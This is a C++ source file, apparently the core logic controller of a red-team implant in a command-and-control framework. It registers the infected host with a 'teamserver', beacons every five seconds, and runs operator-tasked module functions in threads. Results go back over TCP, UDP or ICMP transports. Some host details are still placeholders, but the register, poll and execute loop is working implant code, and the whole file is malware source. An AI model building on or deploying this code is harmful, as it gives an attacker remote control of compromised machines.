#include "logic_controller.hpp"

namespace hivemind_lib {
bool LogicController::running_ = true;
boost::mutex LogicController::thread_infos_lock_;

LogicController::LogicController() {
  this->transport_method_ = NONE;
  signal(SIGINT, LogicController::SignalHandler);
  signal(SIGABRT, LogicController::SignalHandler);
  signal(SIGTERM, LogicController::SignalHandler);
}

int LogicController::RegisterBot() {
  if (!this->transport_) {
    this->SetError();
    return -1;
  }
  struct RegistrationRequest registration_request;
  struct Packet packet;
// TODO Get this
  this->implant_info_ = {"", "192.168.7.1"};

  std::vector<ModuleInfo> values;

  for (const auto &kv : this->modules_) {
    values.push_back(kv.second->mod_info_);
  }

// TODO Get this stuff
  registration_request.hostname = "Meep";
  registration_request.MAC = "aa:ss:dd:ff:gg:hh";
  registration_request.implantVersion = "1337";
  registration_request.IP = this->implant_info_.primaryIP;
  registration_request.implantName = "Battle Paddle";
  registration_request.OS = "Windows trash";
  registration_request.supportedModules = values;
//******************

  nlohmann::json j = nlohmann::json(registration_request);

// TODO determine fingerprint
  packet.fingerprint = "fingerprint";
  packet.implantInfo = this->implant_info_;
  packet.numLeft = 0;
  packet.packetType = REGISTRATION_REQUEST_CODE;
  packet.data = j.dump();

  nlohmann::json p = nlohmann::json(packet);
  DEBUG(p.dump(), LEVEL_DEBUG);

  auto response = this->transport_->SendAndReceive(p.dump());
  DEBUG(response, LEVEL_DEBUG);
  try {
    nlohmann::json resp = nlohmann::json::parse(response);
    auto packet_resp = resp.get<std::vector<Packet>>();
    if (packet_resp[0].packetType == REGISTRATION_RESPONSE_CODE) {
      DEBUG("Packet type received: " << packet_resp[0].packetType, LEVEL_DEBUG);
      auto inner_data = nlohmann::json::parse(packet_resp[0].data);
      auto reg_resp = inner_data.get<RegistrationResponse>();
      this->implant_info_.UUID = reg_resp.UUID;
    } else if (packet_resp[0].packetType == ERROR_CODE) {
      DEBUG("Packet type received: " << packet_resp[0].packetType, LEVEL_DEBUG);
      auto inner_data = nlohmann::json::parse(packet_resp[0].data);
      auto reg_error = inner_data.get<Error>();
      DEBUG("Error with registration: " << reg_error.errorNum, LEVEL_ERROR);
      if (reg_error.errorNum == DUPLICATE_REGISTRATION) {
        DEBUG("Was previously registered, received UUID", LEVEL_DEBUG);
        this->implant_info_.UUID = packet_resp[0].implantInfo.UUID;
        return 0;
      }
      this->SetError();
      return reg_error.errorNum;
    } else {
      DEBUG("Unexpected packet type: " << packet_resp[0].packetType, LEVEL_ERROR);
      this->SetError();
      return ERROR_CODE;
    }
  } catch (...) {
    DEBUG("Error in parsing registration packet", LEVEL_ERROR);
    this->SetError();
    return ERROR_CODE;
  }
  return 0;
}

void LogicController::ThreadHandlerFunc() {
  while (running_) {
    thread_infos_lock_.lock();
    DEBUG("Checking running threads", LEVEL_DEBUG);
    auto thread_info = std::begin(thread_infos_);
    while (thread_info != std::end(thread_infos_)) {
      if (!thread_info->thread.timed_join(0)) {
        DEBUG("Thread finished, joining to clean", LEVEL_INFO);
        thread_info->thread.join();
        thread_info = thread_infos_.erase(thread_info);
      } else if (thread_info->time_start + thread_info->timeout < std::time(nullptr)) {
        DEBUG("Thread exceeded timeout, terminating", LEVEL_INFO);
        thread_info->thread.interrupt();
        thread_info->thread.join();
        thread_info = thread_infos_.erase(thread_info);
      }
      if (thread_info != std::end(thread_infos_)) {
        ++thread_info;
      }
    }
    thread_infos_lock_.unlock();
    // TODO determine if this is a good time
    boost::this_thread::sleep_for(boost::chrono::milliseconds(1000));
  }

  thread_infos_lock_.lock();
  for (auto &t :  thread_infos_) {
    t.thread.interrupt();
    t.thread.join();
  }
  thread_infos_lock_.unlock();

  DEBUG("Exiting ThreadHandler", LEVEL_INFO);
}

void LogicController::FuncExecutor(const std::string &mod,
                                   const std::string &func,
                                   const std::string &data,
                                   const std::string &action_id) {
  struct ActionResponse action_response{};
  struct Packet packet;

  action_response.actionId = action_id;
  action_response.response = this->modules_[mod]->func_map_[func](data);

  nlohmann::json r = nlohmann::json(action_response);

  packet.fingerprint = "fingerprint";
  packet.implantInfo = this->implant_info_;
  packet.numLeft = 0;
  packet.packetType = ACTION_RESPONSE_CODE;
  packet.data = r.dump();

  nlohmann::json p = nlohmann::json(packet);

  this->transport_->Send(p.dump());
}

void LogicController::CreateFuncExecutor(const std::string &mod,
                                         const std::string &func,
                                         const std::string &data,
                                         const std::string &action_id) {
  struct ThreadInfo thread_info{};
  thread_info.thread = boost::thread(&LogicController::FuncExecutor, this, mod, func, data, action_id);
  thread_info.time_start = std::time(nullptr);
  thread_info.timeout = this->modules_[mod]->timeout_map_[func];
  thread_infos_lock_.lock();
  this->thread_infos_.push_back(std::move(thread_info));
  thread_infos_lock_.unlock();
}

//TODO Implement this.
void LogicController::BeginComms() {
  if (this->implant_info_.UUID.empty()) {
    this->SetError();
    return;
  }
  auto thread_handler = boost::thread([this] { ThreadHandlerFunc(); });

  struct Packet packet;

  packet.fingerprint = "fingerprint";
  packet.implantInfo = this->implant_info_;
  packet.numLeft = 0;
  packet.packetType = ACTION_REQUEST;
  packet.data = "";

  nlohmann::json p = nlohmann::json(packet);
  DEBUG(p.dump(), LEVEL_DEBUG);
  while (LogicController::running_) {
    auto response = this->transport_->SendAndReceive(p.dump());
    DEBUG(response, LEVEL_DEBUG);
    if (response.length() == 0) {
      DEBUG("No connection to teamserver", LEVEL_ERROR);
      continue;
    }
    try {
      nlohmann::json resp = nlohmann::json::parse(response);
      auto packet_resps = resp.get<std::vector<Packet>>();
      DEBUG("PARSED PACKET", LEVEL_DEBUG);
      for (auto packet_resp : packet_resps) {
        DEBUG("Packet type received: " << packet_resp.packetType, LEVEL_DEBUG);
        if (packet_resp.packetType == ACTION_CODE) {
          DEBUG("Received an action", LEVEL_INFO);
          auto inner_data = nlohmann::json::parse(packet_resp.data);
          auto action = inner_data.get<Action>();
          CreateFuncExecutor(action.module, action.moduleFunc, action.arguments, action.actionId);
        } else if (packet_resp.packetType == ERROR_CODE) {
          auto inner_data = nlohmann::json::parse(packet_resp.data);
          auto reg_error = inner_data.get<Error>();
          DEBUG("Error with packet: " << reg_error.errorNum, LEVEL_ERROR);
        } else if (packet_resp.packetType == NO_ACTION) {
          DEBUG("No Actions", LEVEL_INFO);
        } else {
          DEBUG("Unexpected packet type: " << packet_resp.packetType, LEVEL_ERROR);
        }
      }
    } catch (...) {
      DEBUG("Error in parsing packet", LEVEL_ERROR);
    }
    // TODO make this adjustable
    boost::this_thread::sleep_for(boost::chrono::milliseconds(5000));
  }

  LogicController::running_ = false;
  thread_handler.join();
}

void LogicController::AddModule(ModuleEnum mod) {
  // TODO revamp this
  switch (mod) {
    case ALL: {
      DEBUG("Adding All Modules", LEVEL_DEBUG);
    }
    case PING: {
      DEBUG("Adding Ping Module", LEVEL_DEBUG);
      std::unique_ptr<Module> ping = std::make_unique<PingModule>();
      auto info = ping->Init();
      this->modules_.insert({ping->mod_info_.module_name, std::move(ping)});
      if (mod != ALL) break;
    }
    case COMMAND_LINE: {
      DEBUG("Adding Command Line Module", LEVEL_DEBUG);
      break;
    }
    default: {
      DEBUG("UNKNOWN MODULE", LEVEL_ERROR);
    }
  }
}

void LogicController::SetTransportMethod(TransportEnum transport_enum) {
  this->transport_method_ = transport_enum;
}

void LogicController::InitComms(std::string hostname, std::string port) {
  // TODO Revamp this
  switch (this->transport_method_) {
    case TCP:this->transport_ = std::make_unique<TcpTransport>(std::move(hostname), std::move(port));
      break;
    case UDP:this->transport_ = std::make_unique<UdpTransport>(std::move(hostname), std::move(port));
      break;
    case ICMP:this->transport_ = std::make_unique<IcmpTransport>(std::move(hostname), std::move(port));
      break;
    case NONE:DEBUG("No transport method chosen", LEVEL_ERROR);
      this->SetError();
      break;
  }
}

bool LogicController::HasError() const {
  return this->error_;
}
void LogicController::SetError() {
  this->error_ = true;
}
void LogicController::SignalHandler(int) {
  LogicController::running_ = false;
  DEBUG("Shutting down", LEVEL_INFO);
}
}